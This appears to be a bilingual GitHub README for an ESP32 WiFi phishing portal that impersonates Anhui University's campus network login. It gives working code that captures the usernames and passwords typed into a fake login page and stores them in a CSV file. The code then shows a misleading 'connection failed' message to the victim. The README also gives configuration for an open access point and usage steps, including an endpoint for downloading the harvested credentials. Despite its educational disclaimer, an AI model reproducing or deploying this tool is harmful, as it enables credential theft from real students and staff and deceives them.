# ESP32-WiFi-Phishing-Portal-Project
ESP32 WiFi Phishing Portal Project
# ESP32 WiFi 钓鱼门户项目 模仿安徽大学的校园网登录界面 ahu.portal

本项目是一个基于 ESP32 的 WiFi 钓鱼门户示例，展示了如何创建一个仿真的登录页面，用于收集用户输入的账号和密码信息。**请注意，此项目仅用于教育和研究目的，严禁用于非法用途。**

## 项目概述

该项目的核心功能是创建一个 WiFi 热点，当用户连接后，会跳转到一个仿真的登录页面。用户输入的账号和密码信息会被记录并存储在 ESP32 的 SPIFFS 文件系统中。项目还集成了 RGB LED 指示灯，用于显示操作状态。

## 功能特点

1. **WiFi 热点创建**：ESP32 作为接入点（AP），用户可以连接到该热点。
2. **仿真登录页面**：用户连接后，会看到一个仿真的登录页面，要求输入账号和密码。
3. **数据存储**：用户提交的数据以 CSV 格式存储在 SPIFFS 文件系统中。
4. **RGB LED 指示灯**：根据操作状态，RGB LED 会显示不同的颜色（例如，数据提交成功后显示绿色）。
5. **文件管理**：支持下载和删除存储的数据文件。

## 硬件要求

- ESP32 开发板
- RGB LED（可选）

## 软件依赖

- Arduino IDE
- ESP32 开发板支持包
- 以下 Arduino 库：
  - `WiFi.h`
  - `DNSServer.h`
  - `WebServer.h`
  - `SPIFFS.h`
  - `Adafruit_NeoPixel.h`

## 项目结构

```plaintext
esp32-wifi-portal/
├── esp32-wifi-portal.ino
├── data/
│   ├── ahu.jpg
│   └── funny.jpg
└── README.md
```

## 配置说明

### AP 配置

```cpp
const char* AP_SSID = "ahu.portal";
const char* AP_PASSWORD = NULL;
const int AP_CHANNEL = 13;
```

### RGB LED 配置

```cpp
#define LED_PIN 48
#define LED_COUNT 1
Adafruit_NeoPixel strip(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);
```

### 门户页面 HTML

门户页面的 HTML 代码存储在 `portalPage` 变量中，包含一个仿真的登录表单和样式。

## 主要功能实现

### 数据提交处理

```cpp
void handleSubmit() {
  String account = webServer.arg("account");
  String password = webServer.arg("password");

  Serial.printf("收到新数据：\n账号：%s\n密码：%s\n\n", account.c_str(), password.c_str());

  File file = SPIFFS.open("/data.csv", FILE_APPEND);
  if (!file) {
    Serial.println("文件打开失败！错误代码: " + String(file.getWriteError()));
    webServer.send(500, "text/plain", "服务器存储错误");
    return;
  }
  
  if (!file.printf("%lu,%s,%s\n", millis(), account.c_str(), password.c_str())) {
    Serial.println("写入失败！剩余空间: " + String(SPIFFS.totalBytes() - SPIFFS.usedBytes()) + " bytes");
    webServer.send(500, "text/plain", "写入失败");
  } else {
    Serial.println("数据已保存");
    strip.setPixelColor(0, strip.Color(0, 255, 0)); // 设置灯珠为绿色
    strip.setBrightness(10); // 设置亮度（0-255范围）
    strip.show();
    webServer.send(200, "text/html; charset=utf-8", "<h2>连接失败，请五分钟后稍后再试！</h2>");
  }
  file.close();
}
```

### 文件管理功能

```cpp
void handleDelete() {
  if (SPIFFS.remove("/data.csv")) {
    Serial.println("文件已删除");
    webServer.send(200, "text/plain; charset=utf-8", "文件已清除");
  } else {
    webServer.send(500, "text/plain; charset=utf-8", "删除失败");
  }
}
```

## 使用方法

1. 将代码上传到 ESP32 开发板。
2. 打开手机或电脑的 WiFi 设置，连接到 `ahu.portal` 热点。
3. 打开浏览器，访问任意网址，会自动跳转到仿真登录页面。
4. 输入账号和密码后，数据会被记录并存储在 ESP32 中。
5. 可以通过 `/download` 路径下载数据文件，或通过 `/delete` 路径删除数据文件。

## 免责声明

本项目仅用于教育和研究目的，严禁用于非法用途。开发者不对任何滥用行为负责。使用本项目前，请确保遵守当地法律法规。

---

**注意**：请始终遵循道德和法律规范，切勿将此类技术用于非法活动。
# ESP32 WiFi Phishing Portal Project

This project demonstrates how to create a simulated login portal using an ESP32 microcontroller. When users connect to the WiFi hotspot, they are redirected to a fake login page where their entered credentials (username and password) are captured and stored in the ESP32's SPIFFS file system. **Please note that this project is for educational and research purposes only. Unauthorized or malicious use is strictly prohibited.**

## Project Overview

The core functionality of this project is to create a WiFi hotspot that mimics a legitimate network. Upon connecting, users are presented with a fake login page. Any credentials entered are logged and saved to a CSV file on the ESP32. The project also includes an RGB LED to indicate operational status.

## Key Features

1. **WiFi Hotspot Creation**: The ESP32 acts as an access point (AP), allowing users to connect.
2. **Simulated Login Page**: Users are redirected to a fake login page after connecting.
3. **Data Storage**: Captured credentials are stored in a CSV file on the ESP32's SPIFFS file system.
4. **RGB LED Indicator**: The RGB LED changes color based on the operation status (e.g., green for successful data capture).
5. **File Management**: Supports downloading and deleting the stored data file.

## Hardware Requirements

- ESP32 development board
- RGB LED (optional)

## Software Dependencies

- Arduino IDE
- ESP32 board support package
- The following Arduino libraries:
  - `WiFi.h`
  - `DNSServer.h`
  - `WebServer.h`
  - `SPIFFS.h`
  - `Adafruit_NeoPixel.h`

## Project Structure

```plaintext
esp32-wifi-portal/
├── esp32-wifi-portal.ino
├── data/
│   ├── ahu.jpg
│   └── funny.jpg
└── README.md
```

## Configuration

### AP Configuration

```cpp
const char* AP_SSID = "ahu.portal";
const char* AP_PASSWORD = NULL;
const int AP_CHANNEL = 13;
```

### RGB LED Configuration

```cpp
#define LED_PIN 48
#define LED_COUNT 1
Adafruit_NeoPixel strip(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);
```

### Portal Page HTML

The HTML code for the fake login page is stored in the `portalPage` variable, which includes a form and styling.

## Key Functionality

### Data Submission Handling

```cpp
void handleSubmit() {
  String account = webServer.arg("account");
  String password = webServer.arg("password");

  Serial.printf("Received new data:\nAccount: %s\nPassword: %s\n\n", account.c_str(), password.c_str());

  File file = SPIFFS.open("/data.csv", FILE_APPEND);
  if (!file) {
    Serial.println("Failed to open file! Error code: " + String(file.getWriteError()));
    webServer.send(500, "text/plain", "Server storage error");
    return;
  }
  
  if (!file.printf("%lu,%s,%s\n", millis(), account.c_str(), password.c_str())) {
    Serial.println("Write failed! Free space: " + String(SPIFFS.totalBytes() - SPIFFS.usedBytes()) + " bytes");
    webServer.send(500, "text/plain", "Write failed");
  } else {
    Serial.println("Data saved");
    strip.setPixelColor(0, strip.Color(0, 255, 0)); // Set LED to green
    strip.setBrightness(10); // Set brightness (0-255)
    strip.show();
    webServer.send(200, "text/html; charset=utf-8", "<h2>Connection failed, please try again in 5 minutes!</h2>");
  }
  file.close();
}
```

### File Management

```cpp
void handleDelete() {
  if (SPIFFS.remove("/data.csv")) {
    Serial.println("File deleted");
    webServer.send(200, "text/plain; charset=utf-8", "File cleared");
  } else {
    webServer.send(500, "text/plain; charset=utf-8", "Delete failed");
  }
}
```

## Usage Instructions

1. Upload the code to the ESP32 development board.
2. Open the WiFi settings on your phone or computer and connect to the `ahu.portal` hotspot.
3. Open a browser and navigate to any website. You will be redirected to the fake login page.
4. Enter any credentials. The data will be logged and stored on the ESP32.
5. Access the `/download` endpoint to download the data file or `/delete` to delete it.

## Disclaimer

This project is intended solely for educational and research purposes. Unauthorized or malicious use is strictly prohibited. The developer is not responsible for any misuse of this project. Ensure compliance with local laws and regulations before using this project.

---

**Note**: Always adhere to ethical and legal standards. Do not use this technology for illegal activities.
